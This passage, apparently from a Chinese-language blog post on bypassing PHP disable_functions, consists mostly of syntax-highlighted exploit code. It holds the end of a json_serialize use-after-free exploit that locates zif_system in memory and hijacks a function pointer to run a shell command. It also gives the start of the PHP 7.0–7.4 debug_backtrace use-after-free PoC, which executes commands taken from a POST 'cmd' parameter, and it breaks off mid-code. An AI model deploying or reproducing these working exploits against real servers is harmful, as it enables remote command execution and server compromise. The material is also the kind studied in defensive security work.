<span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_Write</span><br>                <span class="hljs-comment"># handle pie</span><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_exec</span><br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;constant&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;bin2hex&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123; <span class="hljs-comment"># ELF header</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123; <span class="hljs-comment"># system</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jsonSerialize</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$y</span>, <span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$spl1</span>, <span class="hljs-variable">$fake_tbl_off</span>, <span class="hljs-variable">$n_alloc</span>;<br><br>        <span class="hljs-variable">$contiguous</span> = [];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>            <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DateInterval</span>(<span class="hljs-string">&#x27;PT1S&#x27;</span>);<br><br>        <span class="hljs-variable">$room</span> = [];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>            <span class="hljs-variable">$room</span>[] = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">Z</span>();<br><br>        <span class="hljs-variable">$_protector</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">ptr2str</span>(<span class="hljs-number">0</span>, <span class="hljs-number">78</span>);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;abc = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">ptr2str</span>(<span class="hljs-number">0</span>, <span class="hljs-number">79</span>);<br>        <span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DateInterval</span>(<span class="hljs-string">&#x27;PT1S&#x27;</span>);<br><br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$y</span>[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$p</span>);<br><br>        <span class="hljs-variable">$protector</span> = <span class="hljs-string">&quot;.<span class="hljs-subst">$_protector</span>&quot;</span>;<br><br>        <span class="hljs-variable">$x</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DateInterval</span>(<span class="hljs-string">&#x27;PT1S&#x27;</span>);<br>        <span class="hljs-variable">$x</span>-&gt;d = <span class="hljs-number">0x2000</span>;<br>        <span class="hljs-variable">$x</span>-&gt;h = <span class="hljs-number">0xdeadbeef</span>;<br>        <span class="hljs-comment"># $this-&gt;abc is now of size 0x2000</span><br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$this</span>-&gt;abc) != <span class="hljs-number">0xdeadbeef</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;UAF failed.&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$spl1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MySplFixedArray</span>();<br>        <span class="hljs-variable">$spl2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MySplFixedArray</span>();<br><br>        <span class="hljs-comment"># some leaks</span><br>        <span class="hljs-variable">$class_entry</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0x120</span>);<br>        <span class="hljs-variable">$handlers</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0x128</span>);<br>        <span class="hljs-variable">$php_heap</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0x1a8</span>);<br>        <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0x218</span>;<br><br>        <span class="hljs-comment"># create a fake class_entry</span><br>        <span class="hljs-variable">$fake_obj</span> = <span class="hljs-variable">$abc_addr</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>); <span class="hljs-comment"># type</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0x120</span>, <span class="hljs-variable">$abc_addr</span>); <span class="hljs-comment"># fake class_entry</span><br><br>        <span class="hljs-comment"># copy some of class_entry definition</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">16</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0x10</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>, <br>                <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak1</span>(<span class="hljs-variable">$class_entry</span> + <span class="hljs-number">0x10</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>));<br>        &#125;<br><br>        <span class="hljs-comment"># fake static members table</span><br>        <span class="hljs-variable">$fake_tbl_off</span> = <span class="hljs-number">0x70</span> * <span class="hljs-number">4</span> - <span class="hljs-number">16</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0x30</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_tbl_off</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0x38</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_tbl_off</span>);<br><br>        <span class="hljs-comment"># fake zval_reference</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-variable">$fake_tbl_off</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_tbl_off</span> + <span class="hljs-number">0x10</span>); <span class="hljs-comment"># zval</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-variable">$fake_tbl_off</span> + <span class="hljs-number">8</span>, <span class="hljs-number">10</span>); <span class="hljs-comment"># zval type (reference)</span><br><br>        <span class="hljs-comment"># look for binary base</span><br>        <span class="hljs-variable">$binary_leak</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$handlers</span> + <span class="hljs-number">0x10</span>);<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment"># parse elf header</span><br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment"># get basic_functions address</span><br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment"># find system entry</span><br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>        &#125;<br>        <br>        <span class="hljs-comment"># copy hashtable offsetGet bucket</span><br>        <span class="hljs-variable">$fake_bkt_off</span> = <span class="hljs-number">0x70</span> * <span class="hljs-number">5</span> - <span class="hljs-number">16</span>;<br><br>        <span class="hljs-variable">$function_data</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0x50</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-variable">$fake_bkt_off</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>, <br>                <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$function_data</span> + <span class="hljs-number">0x40</span> * <span class="hljs-number">4</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>));<br>        &#125;<br><br>        <span class="hljs-comment"># create a fake bucket</span><br>        <span class="hljs-variable">$fake_bkt_addr</span> = <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_bkt_off</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0x50</span>, <span class="hljs-variable">$fake_bkt_addr</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">3</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-number">0x58</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>);<br>        &#125;<br><br>        <span class="hljs-comment"># copy bucket zval</span><br>        <span class="hljs-variable">$function_zval</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-variable">$fake_bkt_off</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">12</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc,  <span class="hljs-variable">$fake_bkt_off</span> + <span class="hljs-number">0x70</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>, <br>                <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$function_zval</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>));<br>        &#125;<br><br>        <span class="hljs-comment"># pwn</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-variable">$fake_bkt_off</span> + <span class="hljs-number">0x70</span> + <span class="hljs-number">0x30</span>, <span class="hljs-variable">$zif_system</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-variable">$fake_bkt_off</span>, <span class="hljs-variable">$fake_bkt_addr</span> + <span class="hljs-number">0x70</span>);<br><br>        <span class="hljs-variable">$spl1</span>-&gt;<span class="hljs-title function_ invoke__">offsetGet</span>(<span class="hljs-variable">$cmd</span>);<br><br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$y</span> = [<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">Z</span>()];<br><span class="hljs-title function_ invoke__">json_encode</span>([&amp;<span class="hljs-variable">$y</span>]);<br></code></pre></td></tr></table></figure><h2 id="php7-Backtrace-UAF（PHP-7-0-7-4）"><a href="#php7-Backtrace-UAF（PHP-7-0-7-4）" class="headerlink" title="php7_Backtrace_UAF（PHP 7.0-7.4）"></a>php7_Backtrace_UAF（PHP 7.0-7.4）</h2><p><strong>利用条件</strong></p><ul><li>Linux 操作系统</li><li>PHP7.0 - all versions to date</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 - all versions to date</li><li>PHP7.3 &lt; 7.3.15 (released 20 Feb 2020)</li><li>PHP7.4 &lt; 7.4.3 (released 20 Feb 2020)</li></ul><p><strong>原理</strong></p><p>该漏洞利用在 debug_backtrace() 函数中使用了两年的一个 bug。我们可以诱使它返回对已被破坏的变量的引用，从而导致释放后使用漏洞</p><p><a href="https://bugs.php.net/bug.php?id=76047">Use-after-free when accessing already destructed backtrace arguments</a></p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Bug: https://bugs.php.net/bug.php?id=76047</span><br><span class="hljs-comment"># debug_backtrace() returns a reference to a variable</span><br><span class="hljs-comment"># that has been destroyed, causing a UAF vulnerability.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This exploit should work on all PHP 7.0-7.4 versions</span><br><span class="hljs-comment"># released as of 30/01/2020.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Author: https://github.com/mm0r1</span><br><br><span class="hljs-comment">//pwn(&quot;uname -a&quot;);</span><br><span class="hljs-title function_ invoke__">pwn</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>; <br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;<span class="hljs-title function_ invoke__">getTrace</span>(); <span class="hljs-comment"># ;)</span><br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123; <span class="hljs-comment"># PHP &gt;= 7.4</span><br>                <span class="hljs-variable">$backtrace</span> = <span class="hljs-title function_ invoke__">debug_backtrace</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span 